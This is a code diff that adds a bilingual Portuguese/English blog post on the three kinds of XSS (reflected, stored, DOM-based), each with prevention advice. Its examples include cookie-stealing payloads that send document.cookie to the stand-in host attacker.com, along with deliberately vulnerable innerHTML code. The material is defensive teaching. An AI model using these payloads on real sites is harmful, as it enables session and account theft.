@@ -2564,6 +2564,364 @@ Soon, I plan to publish the complete project with documentation and open source 
       date: '2025-11-14',
       author: 'Pablo Sodré',
       images: ['/postman-jwt-login.png', '/mysql-dotenv-config.png', '/postman-user-signup.png']
+    },
+    {
+      id: 15,
+      title: lang === 'pt' ? 'XSS: As 3 Classificações que Todo Desenvolvedor Deveria Conhecer' : 'XSS: The 3 Classifications Every Developer Should Know',
+      excerpt: lang === 'pt'
+        ? 'Entenda as três classificações de XSS: Reflected, Stored e DOM-based. Aprenda como identificar, prevenir e testar essas vulnerabilidades de forma ética.'
+        : 'Understand the three XSS classifications: Reflected, Stored, and DOM-based. Learn how to identify, prevent, and test these vulnerabilities ethically.',
+      content: lang === 'pt'
+        ? `# XSS: As 3 Classificações que Todo Desenvolvedor Deveria Conhecer
+
+Olá, rede! 🫡
+
+Cross-Site Scripting (XSS) é uma das vulnerabilidades mais comuns e perigosas em aplicações web. Mesmo sendo conhecida há décadas, ainda aparece constantemente em aplicações modernas. Hoje vou explicar as **3 classificações principais de XSS** e como você pode identificá-las, prevenir e testar de forma ética.
+
+## O que é XSS?
+
+XSS é uma vulnerabilidade que permite a um atacante injetar código JavaScript malicioso em uma página web, que será executado no navegador de outros usuários. O código injetado pode roubar cookies, sessões, credenciais, ou até mesmo assumir o controle da conta do usuário.
+
+## Por que isso importa?
+
+XSS está constantemente no **Top 10 do OWASP** e é uma das vulnerabilidades mais exploradas em aplicações web. Entender as diferentes classificações ajuda desenvolvedores a implementar proteções adequadas e testadores a identificar vulnerabilidades de forma mais eficiente.
+
+## As 3 Classificações de XSS
+
+### 1. Reflected XSS (XSS Refletido)
+
+**Reflected XSS** é quando o código malicioso é refletido imediatamente na resposta da aplicação, geralmente através de parâmetros de URL ou formulários. O script não é armazenado permanentemente, ele só existe na resposta específica que contém o payload.
+
+#### Como funciona?
+
+O atacante cria uma URL maliciosa que contém o código JavaScript:
+
+\`\`\`
+https://exemplo.com/busca?q=<script>alert('XSS')</script>
+\`\`\`
+
+Se a aplicação não sanitizar o parâmetro \`q\` e simplesmente refletir na página:
+
+\`\`\`html
+<div>Você buscou por: <script>alert('XSS')</script></div>
+\`\`\`
+
+O script será executado no navegador da vítima quando ela acessar essa URL.
+
+#### Características do Reflected XSS:
+
+- **Não persistente:** O payload não é armazenado no servidor
+- **Requer interação:** A vítima precisa clicar no link malicioso
+- **Mais fácil de detectar:** Geralmente aparece em logs do servidor
+- **Comum em:** Barras de busca, formulários de contato, mensagens de erro
+
+#### Exemplo Prático:
+
+\`\`\`javascript
+// URL maliciosa criada pelo atacante
+https://site.com/busca?termo=<script>
+  document.location='http://atacante.com/roubar?cookie='+document.cookie
+</script>
+
+// Se a aplicação refletir sem sanitizar:
+<div>Resultados para: <script>...</script></div>
+\`\`\`
+
+#### Prevenção:
+
+- **Sanitização:** Remover ou codificar caracteres especiais (\`<\`, \`>\`, \`"\`, \`'\`, \`&\`)
+- **Validação de entrada:** Validar e rejeitar entradas suspeitas
+- **Content Security Policy (CSP):** Limitar quais scripts podem ser executados
+- **Encoding:** Usar funções como \`htmlspecialchars()\` ou \`encodeURIComponent()\`
+
+### 2. Stored XSS (XSS Armazenado)
+
+**Stored XSS** é quando o código malicioso é armazenado permanentemente no servidor (banco de dados, arquivos, etc.) e é executado toda vez que a página que contém esse conteúdo é acessada. É considerado o mais perigoso dos três tipos.
+
+#### Como funciona?
+
+O atacante injeta o código malicioso em um campo que é armazenado no servidor, como comentários, posts, perfis de usuário, ou mensagens:
+
+\`\`\`
+Comentário: <script>alert('XSS')</script>
+\`\`\`
+
+Quando outro usuário visualiza a página que exibe esse comentário, o script é executado automaticamente.
+
+#### Características do Stored XSS:
+
+- **Persistente:** O payload fica armazenado no servidor
+- **Não requer interação direta:** A vítima só precisa acessar a página infectada
+- **Mais perigoso:** Pode afetar múltiplos usuários automaticamente
+- **Comum em:** Comentários, fóruns, perfis de usuário, sistemas de mensagens
+
+#### Exemplo Prático:
+
+\`\`\`javascript
+// Atacante envia comentário malicioso:
+Comentário: <img src=x onerror="fetch('http://atacante.com/roubar?cookie='+document.cookie)">
+
+// O comentário é armazenado no banco de dados
+// Quando qualquer usuário visualiza a página:
+<div class="comentario">
+  <img src=x onerror="fetch('http://atacante.com/roubar?cookie='+document.cookie)">
+</div>
+// O script é executado automaticamente
+\`\`\`
+
+#### Prevenção:
+
+- **Sanitização rigorosa:** Remover ou codificar todo HTML/JavaScript antes de armazenar
+- **Whitelist de tags permitidas:** Permitir apenas tags seguras (se necessário)
+- **Validação no servidor:** Nunca confiar apenas em validação no cliente
+- **Output encoding:** Codificar na saída também, como camada extra de proteção
+
+### 3. DOM-based XSS
+
+**DOM-based XSS** é quando a vulnerabilidade está no código JavaScript do lado do cliente. O código malicioso não passa pelo servidor, ele é injetado diretamente no DOM através de manipulação JavaScript vulnerável.
+
+#### Como funciona?
+
+O atacante explora código JavaScript que manipula o DOM de forma insegura:
+
+\`\`\`javascript
+// Código vulnerável na aplicação:
+var userInput = location.hash.substring(1);
+document.getElementById('mensagem').innerHTML = userInput;
+
+// Atacante cria URL:
+https://exemplo.com/#<img src=x onerror="alert('XSS')">
+
+// O JavaScript da página executa e injeta no DOM
+\`\`\`
+
+#### Características do DOM-based XSS:
+
+- **Client-side:** A vulnerabilidade está no JavaScript do navegador
+- **Não aparece em logs do servidor:** O payload nunca chega ao servidor
+- **Mais difícil de detectar:** Requer análise do código JavaScript
+- **Comum em:** SPAs (Single Page Applications), manipulação de URL, localStorage, sessionStorage
+
+#### Exemplo Prático:
+
+\`\`\`javascript
+// Código vulnerável:
+function mostrarResultado() {
+  var query = new URLSearchParams(window.location.search).get('q');
+  document.getElementById('resultado').innerHTML = 'Você buscou: ' + query;
+}
+
+// URL maliciosa:
+https://app.com/?q=<script>alert('XSS')</script>
+
+// O JavaScript executa e injeta no DOM sem passar pelo servidor
+\`\`\`
+
+#### Prevenção:
+
+- **Evitar innerHTML/innerText inseguros:** Usar \`textContent\` ou métodos seguros
+- **Validação no cliente:** Validar e sanitizar antes de manipular o DOM
+- **Evitar eval():** Nunca usar \`eval()\` ou funções similares com entrada do usuário
+- **Usar APIs seguras:** Preferir APIs modernas que fazem encoding automático
+
+## Comparação Rápida
+
+| Característica | Reflected | Stored | DOM-based |
+|----------------|-----------|--------|-----------|
+| **Persistência** | Não | Sim | Não |
+| **Onde fica** | URL/Parâmetros | Banco de dados | DOM/JavaScript |
+| **Detecção** | Logs do servidor | Logs do servidor | Código JavaScript |
+| **Gravidade** | Média | Alta | Média-Alta |
+| **Interação necessária** | Sim (clicar link) | Não | Sim (acessar URL) |
+
+## Conclusão
+
+XSS continua sendo uma vulnerabilidade crítica e comum. Entender as três classificações, **Reflected**, **Stored** e **DOM-based**, é essencial tanto para desenvolvedores quanto para profissionais de segurança.
+
+A chave está em:
+- **Sanitização adequada** de todas as entradas
+- **Validação** tanto no cliente quanto no servidor
+- **Uso de frameworks seguros** e boas práticas
+- **Testes regulares** de segurança
+
+Lembre-se: segurança é um processo contínuo, não um destino. 🛡️`
+        : `# XSS: The 3 Classifications Every Developer Should Know
+
+Hello, network! 🫡
+
+Cross-Site Scripting (XSS) is one of the most common and dangerous vulnerabilities in web applications. Even though it's been known for decades, it still appears constantly in modern applications. Today I'll explain the **3 main XSS classifications** and how you can identify, prevent, and test them ethically.
+
+## What is XSS?
+
+XSS is a vulnerability that allows an attacker to inject malicious JavaScript code into a web page, which will be executed in other users' browsers. The injected code can steal cookies, sessions, credentials, or even take control of the user's account.
+
+## Why does this matter?
+
+XSS is constantly in the **OWASP Top 10** and is one of the most exploited vulnerabilities in web applications. Understanding the different classifications helps developers implement adequate protections and testers identify vulnerabilities more efficiently.
+
+## The 3 XSS Classifications
+
+### 1. Reflected XSS
+
+**Reflected XSS** is when malicious code is immediately reflected in the application's response, usually through URL parameters or forms. The script is not permanently stored, it only exists in the specific response that contains the payload.
+
+#### How does it work?
+
+The attacker creates a malicious URL that contains JavaScript code:
+
+\`\`\`
+https://example.com/search?q=<script>alert('XSS')</script>
+\`\`\`
+
+If the application doesn't sanitize the \`q\` parameter and simply reflects it on the page:
+
+\`\`\`html
+<div>You searched for: <script>alert('XSS')</script></div>
+\`\`\`
+
+The script will be executed in the victim's browser when they access this URL.
+
+#### Reflected XSS Characteristics:
+
+- **Non-persistent:** The payload is not stored on the server
+- **Requires interaction:** The victim needs to click the malicious link
+- **Easier to detect:** Usually appears in server logs
+- **Common in:** Search bars, contact forms, error messages
+
+#### Practical Example:
+
+\`\`\`javascript
+// Malicious URL created by attacker
+https://site.com/search?term=<script>
+  document.location='http://attacker.com/steal?cookie='+document.cookie
+</script>
+
+// If the application reflects without sanitizing:
+<div>Results for: <script>...</script></div>
+\`\`\`
+
+#### Prevention:
+
+- **Sanitization:** Remove or encode special characters (\`<\`, \`>\`, \`"\`, \`'\`, \`&\`)
+- **Input validation:** Validate and reject suspicious inputs
+- **Content Security Policy (CSP):** Limit which scripts can be executed
+- **Encoding:** Use functions like \`htmlspecialchars()\` or \`encodeURIComponent()\`
+
+### 2. Stored XSS
+
+**Stored XSS** is when malicious code is permanently stored on the server (database, files, etc.) and is executed every time the page containing that content is accessed. It's considered the most dangerous of the three types.
+
+#### How does it work?
+
+The attacker injects malicious code into a field that is stored on the server, such as comments, posts, user profiles, or messages:
+
+\`\`\`
+Comment: <script>alert('XSS')</script>
+\`\`\`
+
+When another user views the page that displays this comment, the script is automatically executed.
+
+#### Stored XSS Characteristics:
+
+- **Persistent:** The payload remains stored on the server
+- **No direct interaction required:** The victim only needs to access the infected page
+- **More dangerous:** Can affect multiple users automatically
+- **Common in:** Comments, forums, user profiles, messaging systems
+
+#### Practical Example:
+
+\`\`\`javascript
+// Attacker sends malicious comment:
+Comment: <img src=x onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)">
+
+// The comment is stored in the database
+// When any user views the page:
+<div class="comment">
+  <img src=x onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)">
+</div>
+// The script is automatically executed
+\`\`\`
+
+#### Prevention:
+
+- **Rigorous sanitization:** Remove or encode all HTML/JavaScript before storing
+- **Whitelist of allowed tags:** Allow only safe tags (if necessary)
+- **Server-side validation:** Never trust client-side validation alone
+- **Output encoding:** Encode on output as well, as an extra layer of protection
+
+### 3. DOM-based XSS
+
+**DOM-based XSS** is when the vulnerability is in the client-side JavaScript code. The malicious code doesn't pass through the server, it's injected directly into the DOM through vulnerable JavaScript manipulation.
+
+#### How does it work?
+
+The attacker exploits JavaScript code that manipulates the DOM insecurely:
+
+\`\`\`javascript
+// Vulnerable code in the application:
+var userInput = location.hash.substring(1);
+document.getElementById('message').innerHTML = userInput;
+
+// Attacker creates URL:
+https://example.com/#<img src=x onerror="alert('XSS')">
+
+// The page's JavaScript executes and injects into the DOM
+\`\`\`
+
+#### DOM-based XSS Characteristics:
+
+- **Client-side:** The vulnerability is in the browser's JavaScript
+- **Doesn't appear in server logs:** The payload never reaches the server
+- **Harder to detect:** Requires JavaScript code analysis
+- **Common in:** SPAs (Single Page Applications), URL manipulation, localStorage, sessionStorage
+
+#### Practical Example:
+
+\`\`\`javascript
+// Vulnerable code:
+function showResult() {
+  var query = new URLSearchParams(window.location.search).get('q');
+  document.getElementById('result').innerHTML = 'You searched: ' + query;
+}
+
+// Malicious URL:
+https://app.com/?q=<script>alert('XSS')</script>
+
+// JavaScript executes and injects into DOM without going through server
+\`\`\`
+
+#### Prevention:
+
+- **Avoid unsafe innerHTML/innerText:** Use \`textContent\` or safe methods
+- **Client-side validation:** Validate and sanitize before manipulating DOM
+- **Avoid eval():** Never use \`eval()\` or similar functions with user input
+- **Use secure APIs:** Prefer modern APIs that do automatic encoding
+
+## Quick Comparison
+
+| Characteristic | Reflected | Stored | DOM-based |
+|----------------|-----------|--------|-----------|
+| **Persistence** | No | Yes | No |
+| **Where it stays** | URL/Parameters | Database | DOM/JavaScript |
+| **Detection** | Server logs | Server logs | JavaScript code |
+| **Severity** | Medium | High | Medium-High |
+| **Interaction needed** | Yes (click link) | No | Yes (access URL) |
+
+## Conclusion
+
+XSS continues to be a critical and common vulnerability. Understanding the three classifications, **Reflected**, **Stored**, and **DOM-based**, is essential for both developers and security professionals.
+
+The key is:
+- **Adequate sanitization** of all inputs
+- **Validation** on both client and server
+- **Use of secure frameworks** and best practices
+- **Regular security testing**
+
+Remember: security is a continuous process, not a destination. 🛡️`,
+      category: 'hacking',
+      date: '2025-11-15',
+      author: 'Pablo Sodré',
+      images: []
     }
   ];
 };
